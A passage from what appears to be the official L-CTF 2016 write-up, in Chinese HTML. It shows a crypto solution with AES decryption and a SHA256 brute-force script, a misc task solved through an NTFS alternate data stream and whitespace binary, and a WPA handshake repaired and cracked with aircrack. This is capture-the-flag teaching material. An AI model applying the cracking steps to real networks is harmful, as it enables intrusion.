string">'7QpydF/gtKINERN/KQsVMPgcHFBT4UcZGzc+rbbhzluDA26+T1f0wXzo/o3D8bHGaDNi8dSD1/HP\nsayjyiVlN9Dl3IeMhszEUle/hQN3o1rEBXb9pNt7POfoMNO/KjK9Dx6E597Mk5ge6HqJKw34OMrL\nHgpl8aD99nVk04GTdE55W7mFNvKWSGpGyq2eo9GlMWz2d9y4oAHB9d74ukqMAmvBN0jwuBnzFNPE\n/H0R7ZZAys9RhGxI9Ul21BeGAfZwIcS0WRadbcgxEduEcySiuccbxkMaTd45WXd+OjZ0A/7AnV16\ngls8tLFN1a0K7VrbnjgyG1gqiz0KbCofVMal/x0rAN8Mvy9F4CWrU496Kl5BQTgdkkciZDzHzqkx\nikWtHRHivaZxJsvv5OzE5dvvkRP3dpM0ciJ2hyPabfCNTGNe+AuFuDdhvf+Z3ETkZR36K/UZguju\n4ZvoNKxhLq6v44YklUNJ6rplY8DWsUUxe3m/AbPUb/mKbJ1ddOKSao8IiNtHgOQMe2ec5hnaY6Om\nFGQarjR8qYS8W89PPAlmRYe6ifejDCbP3xWBf6XxgEw8JOM0D4pdn7fpLH1Mdf0N5JVXG20fYENs\nUsilIIVmF9PbBBeuZNtvTjYPfaGMdW7dmCgwpBk8gIfJoBGw6AHLPIRvbn2c56jywvP8RPuFkxgX\njxbHjkkHTRevRuBBFo9sSahSyE0qR/iOhsURfxC3Q74hj3qimIdAd7nqCXUi7J3WX2A5gUr1rpCI\nRKy0zNvPiSHDB9MWTQ8BAO0nnQaBld/5Se99IK2omFnOig2tt6/USM/MN/eeY1K/BVe0SPp0VnFA\n716T/A++ayDV/3esqKu/bXV3r56XmBFDGAqiAyCPH+Pu8t7WUzQXckuJn9X7Psc0vQDOck61k4Hq\nUNIdUWX6WQPQ3mhAXa8FlAcLIYWv1/H7SCTXF005Sb69yxbUxCC6FIIN9xx5kvj1pmT8DbWHFwhG\njwmgJinW6dJ1E5hh1Awfd7/CZPcW5/7RBCifdBMZXyVfPbh/bFLBCaQqONA09C8IbalLSxbl9qD0\nN8iD5NmFGXT8qfYR/PITFiOdbLNO6xlcRBf/Kn19CSD1VEyRND4MXYvjjIQ3rHCsdCtCMRImYkXL\nFakZ0mU2uhFRZlOymb7gCuhS8cQVw9SDDmb25Y9fIJ3QHqazTgxz7kLyb519Bf1ZE5ygclU4vzWY\nde2jQ/UHaq5pyqjg8Jd/epZ2BeQP9Z4WMps5gAHwmFfcK5WDwI7HT3eg7bebo1+yX2U8FRzxc5EQ\ncOiw0artxnSbG/n6j32eMRtF5W3pov4korSghlYGSjf/eGueDJbW6T4+SeGLRdgles0yrkEN6K1M\nx5qcn0bsBL4irfT00IMo3m6DRiHwIUSnxBLeQPEnDNH0LMbg5xU1E3I4C7CX4cJGRB+LNyrx/kbf\nrAw0CoI8XRBx/2IINBsuK/j4OP3V\n'</code><code class="python plain">]</code></div><div class="line number34 index33 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">each&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">aes_cipher:</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">aes</code><code class="python keyword">=</code><code class="python plain">AES.new(AES_key,&nbsp;AES.MODE_CBC,each[:</code><code class="python value">16</code><code class="python plain">])</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python plain">aes.decrypt(each.decode(</code><code class="python string">'base64'</code><code class="python plain">))[</code><code class="python value">16</code><code class="python plain">:]</code></div><div class="line number37 index36 alt2"><code class="python plain">esign</code><code class="python keyword">=</code><code class="python plain">[</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177114900132904208031268302055034139561094L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177043126968026032278260335612769217465281L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177048437820735552471626935982805579762300L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177021833404976799204855378090578793909689L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177047077353854576295462347808999410606732L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177109317561681513876512377036078526549896L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177046828309551946677942463028497367867022L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177054808825693181779307343835312685224642L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177108259205278901023354961482837418958536L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177118898318679253860822585787041787977907L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177036512413482804011903184399450788697718L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177114900132898945572068297162714907204040L</code><code class="python plain">,&nbsp;</code><code class="python value">47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177021915162579455595532972926008542466995L</code><code class="python plain">]</code></div><div class="line number38 index37 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">e&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">esign:</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">tmp&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python functions">hex</code><code class="python plain">((e</code><code class="python keyword">%</code><code class="python plain">x))[</code><code class="python value">2</code><code class="python plain">:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].decode(</code><code class="python string">'hex'</code><code class="python plain">)</code></div><div class="line number40 index39 alt1"><code class="python functions">print</code>&nbsp;<code class="python plain">tmp</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">爆破脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">Crypto.</code><code class="python functions">Hash</code>&nbsp;<code class="python keyword">import</code>&nbsp;<code class="python plain">SHA256</code></div><div class="line number2 index1 alt1"><code class="python keyword">from</code>&nbsp;<code class="python plain">Crypto.</code><code class="python functions">Hash</code>&nbsp;<code class="python keyword">import</code>&nbsp;<code class="python plain">SHA512</code></div><div class="line number3 index2 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">time&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">time</code></div><div class="line number4 index3 alt1"><code class="python keyword">import</code>&nbsp;<code class="python plain">string</code></div><div class="line number5 index4 alt2"><code class="python plain">rang&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">string.letters[:</code><code class="python value">26</code><code class="python plain">]</code><code class="python keyword">+</code><code class="python plain">string.digits</code><code class="python keyword">+</code><code class="python string">'_'</code></div><div class="line number6 index5 alt1"><code class="python plain">m</code><code class="python keyword">=</code><code class="python string">'p1eas3_b00m_me__b0om_shak4l4ka_1am_flag'</code></div><div class="line number7 index6 alt2"><code class="python plain">flag1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'p1eas3_b00m_'</code></div><div class="line number8 index7 alt1"><code class="python plain">flag2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'__b0om_shak4l4ka_1am_'</code></div><div class="line number9 index8 alt2"><code class="python plain">h&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'b96648cc3f097c6faf581386b97d7e043521abe2369d1141d9a98d4897770ea7'</code></div><div class="line number10 index9 alt1"><code class="python plain">z</code><code class="python keyword">=</code>&nbsp;<code class="python plain">time()</code></div><div class="line number11 index10 alt2"><code class="python keyword">for</code>&nbsp;<code class="python plain">a&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">rang:</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">b&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">rang:</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">c&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">rang:</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">d&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">rang:</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">e&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">rang:</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">f&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">rang:</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">SHA256.new(flag1</code><code class="python keyword">+</code><code class="python plain">a</code><code class="python keyword">+</code><code class="python plain">b</code><code class="python keyword">+</code><code class="python plain">flag2</code><code class="python keyword">+</code><code class="python plain">c</code><code class="python keyword">+</code><code class="python plain">d</code><code class="python keyword">+</code><code class="python plain">e</code><code class="python keyword">+</code><code class="python plain">f).hexdigest()&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python plain">h:</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python plain">flag1</code><code class="python keyword">+</code><code class="python plain">a</code><code class="python keyword">+</code><code class="python plain">b</code><code class="python keyword">+</code><code class="python plain">flag2</code><code class="python keyword">+</code><code class="python plain">c</code><code class="python keyword">+</code><code class="python plain">d</code><code class="python keyword">+</code><code class="python plain">e</code><code class="python keyword">+</code><code class="python plain">f</code></div><div class="line number19 index18 alt2"><code class="python functions">print</code>&nbsp;<code class="python plain">time()&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">z</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>misc 150</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，我们解压得到一个Misc150.txt文件。这里必须使用Winrar解压，因为其中存在文件流数据。这一点在txt文件以及压缩包大小不一致中也可以看得出来。Misc150.txt中说道 Flag.zip behind me. 暗示着文件流的存在，以及流名称为Flag.zip。我们就使用命令行来访问文件流。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">&gt;"C:\Program Files\WinRAR\winrar.exe" Misc150.txt:Flag.zip</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">打开压缩包，得到一个小压缩包一个图片。其中，小压缩包名字为<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">Steins;Gate</span>也就是命运石之门的名字。而图片的Christina则是命运石的女主角。在题目的描述中，有说道“命运石之门里没有flag”，这也就暗示着flag不在这两文件里面。这样我们剩下的选择就只有当前这个zip文件了。如果细心的话，会发现压缩包的注释部分有非常长条的空白行，将其三行复制出来，tab用1替换，空格用0替换就可以得到一串二进制。简单判断二进制应为7为ASCII码，解码得flag。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01719fbfa221d371f5.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01719fbfa221d371f5.png" title="t0137c4dc2cd41ad3bb.png" alt="http://p8.qhimg.com/t0137c4dc2cd41ad3bb.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">另一种方法是通过Ultra edit等软件，查看包数据也能发现问题。在这一部分有规律的<strong>0x09</strong>，<strong>0x20</strong>，将其提取出来，替换一下也能得到flag。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ca904c80a3271051.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ca904c80a3271051.png" title="t01875e6880ff191990.png" alt="http://p6.qhimg.com/t01875e6880ff191990.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">misc 300</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">拿到流量包，分析可知有两次wpa握手的过程，连接的同一个wifi。第二次握手过程中wireshark根据标志位识别出来的顺序颠倒了，说明握手包有问题。根据wpa认证过程，修改Key Information字段，得到修复的包。然后扔到aircrack去跑，在有hint的情况下三个小时之内能跑出来，得到密码：55672627，然后airdecap解包。本来以为不会有大佬注意到这是被打掉了强制重新连得，没想到大佬们注意到了好细心Orz。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t017bb7659244d64406.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t017bb7659244d64406.png" title="t01559d0816f4f5cccf.png" alt="http://p1.qhimg.com/t01559d0816f4f5cccf.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">tips：应该先爆破再修复和先修复再爆破是不一定的，aircrack如果不修复就爆破是爆破不出来的，有的工具是通过第一次认证破解的，有的工具通过第二次认证破解，如果不修复的话跑出来与否就看用的啥了，通过第二次认证跑的肯定不修复出不来结果。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">总之最后得到通信内容：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">一个文件需要逆向分析：re2</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">一个ip和端口：119.28.62.216:3333</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">re2源码： &nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  cpp"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 